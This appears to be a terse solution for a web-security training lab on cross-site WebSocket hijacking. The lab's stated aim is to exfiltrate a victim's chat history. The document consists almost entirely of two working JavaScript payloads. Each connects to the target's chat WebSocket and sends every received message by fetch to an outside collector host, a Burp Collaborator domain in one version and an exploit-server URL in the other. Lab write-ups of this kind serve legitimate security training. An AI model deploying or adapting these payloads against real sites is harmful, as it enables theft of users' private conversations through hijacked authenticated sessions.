Lab #3 – Cross-site WebSocket hijacking

Target Goal - Perform a cross-site WebSocket hijacking attack to exfiltrate the victim's chat history.

Analysis:

Burp Suite Professional:
-------------------------
<script>
    var ws = new WebSocket('wss://0af8004404244ccbc027811b00d00077.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://0op2f5wteqjjrup6z6xolgh43v9mxcl1.oastify.com', {method: 'POST', mode:'no-cors', body: event.data});
    }
</script>

Burp Suite Community:
---------------------
<script>
    var ws = new WebSocket('wss://0af8004404244ccbc027811b00d00077.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };

    ws.onmessage = function(event) {
        fetch('https://exploit-0aa400b5049f4c92c08e8045013200e7.exploit-server.net/exploit?comment=' + event.data);
    }
</script>


